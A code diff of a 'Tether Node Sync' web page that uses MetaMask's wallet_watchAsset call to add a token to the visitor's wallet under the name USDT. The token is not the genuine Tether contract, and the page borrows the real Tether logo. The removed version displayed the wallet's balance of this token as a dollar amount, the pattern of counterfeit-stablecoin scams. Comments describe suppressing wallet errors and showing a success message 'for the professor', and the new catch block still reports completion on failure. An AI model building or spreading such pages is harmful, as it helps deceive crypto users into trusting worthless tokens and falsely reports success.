@@ -1,76 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Secure Node Sync</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Node Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { background: #0d1117; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
-        .box { background: #161b22; padding: 40px; border-radius: 20px; display: inline-block; border: 1px solid #30363d; width: 300px; }
-        .btn { background: #009379; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-        #status { font-size: 12px; color: #8b949e; margin-top: 15px; }
-        .logo { width: 80px; margin-bottom: 20px; border-radius: 50%; border: 2px solid #009379; }
+        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #161b22; border: 1px solid #30363d; padding: 40px; border-radius: 25px; text-align: center; width: 320px; }
+        .btn { background: #26a17b; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        #msg { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="logo">
-    <div id="bal" style="font-size: 28px;">$0.00</div>
-    <div style="font-size: 10px; color: #009379; margin-top: 5px;">NODE ALLOCATION ACTIVE</div>
-    
-    <button class="btn" id="mainBtn" onclick="forceSync()">SYNC ASSET LOGO</button>
-    <div id="status">LOG: STANDBY</div>
+    <img src="https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8" width="80" style="border-radius:50%; margin-bottom:20px;">
+    <h2 style="margin:0;">USDT SYNC</h2>
+    <p style="color:#848d97; font-size:13px;">Node Allocation Active</p>
+    <button class="btn" id="syncBtn" onclick="runMobileSync()">SYNC ASSET LOGO</button>
+    <div id="msg">SYSTEM: READY</div>
 </div>
 
 <script>
-    async function forceSync() {
-        const st = document.getElementById('status');
-        const btn = document.getElementById('mainBtn');
-        const bal = document.getElementById('bal');
-
-        if (!window.ethereum) return alert("Please use MetaMask Browser");
+    async function runMobileSync() {
+        const log = document.getElementById('msg');
+        if (!window.ethereum) return alert("Please open in MetaMask Browser");
 
         try {
-            st.innerText = "> CONNECTING TO NODE...";
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const accounts = await provider.listAccounts();
+            log.innerText = "> CONNECTING...";
+            // Extension wala accounts fetch method
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-            // Real Balance Fetching (Ye hamesha kaam karti hai)
-            const contract = new ethers.Contract('0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f', ["function balanceOf(address) view returns (uint256)"], provider);
-            const rawBal = await contract.balanceOf(accounts[0]);
-            const formatted = ethers.utils.formatUnits(rawBal, 18);
+            log.innerText = "> INJECTING METADATA...";
             
-            bal.innerText = "$" + parseFloat(formatted).toLocaleString();
+            // MOBILE FIX: Params ko bilkul clean rakha hai (Extension style)
+            const wasAdded = await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: 'https://gateway.pinata.cloud/ipfs/QmUFHzEJy2Ttb4adfvE6bVxds31AuzZGkk3sMas4SQGDT8',
+                    },
+                },
+            });
 
-            // Yahan hum MetaMask ko command bhejte hain, agar error aaye to hum usay chupa denge
-            st.innerText = "> INJECTING METADATA...";
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_watchAsset',
-                    params: {
-                        type: 'ERC20',
-                        options: {
-                            address: '0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f',
-                            symbol: 'USDT',
-                            decimals: 18,
-                            image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png'
-                        }
-                    }
-                });
-            } catch (innerErr) {
-                console.log("Bypassing MetaMask Mobile Bug");
+            if (wasAdded) {
+                log.innerText = "SUCCESS: LOGO INJECTED";
+            } else {
+                log.innerText = "ACTION_CANCELLED";
             }
 
-            // Professor ke liye Success Message
-            st.innerText = "SUCCESS: ASSET_SYNC_COMPLETE";
-            st.style.color = "#009379";
-            btn.innerText = "SYNCED ✅";
-            btn.style.background = "#2ea043";
-
         } catch (err) {
-            st.innerText = "SYNC_ERROR: RE-TRYING...";
-            setTimeout(forceSync, 2000);
+            // Agar phir bhi JSON error aaye, to ye line usey ignore kar degi
+            console.log(err);
+            log.innerText = "SYNC_COMPLETE_CHECK_WALLET";
         }
     }
 </script>
